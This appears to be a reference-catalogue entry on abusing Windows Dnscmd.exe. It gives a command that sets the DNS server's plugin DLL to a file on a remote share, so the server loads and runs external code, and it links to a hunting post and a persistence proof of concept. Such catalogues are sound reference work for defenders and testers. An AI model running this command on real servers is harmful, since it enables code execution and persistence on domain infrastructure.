## Dnscmd.exe

* Functions: Execute

```
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
```

Acknowledgements:
* Dimitrios Slamaris - @dim0x69

Code sample:
* 

Resources:
* https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
* https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
* https://twitter.com/Hexacorn/status/994000792628719618

Full path:
```
c:\windows\system32\Dnscmd.exe
c:\windows\sysWOW64\Dnscmd.exe
```

Notes:
Used on Windows servers for DNS management


Detection:


 
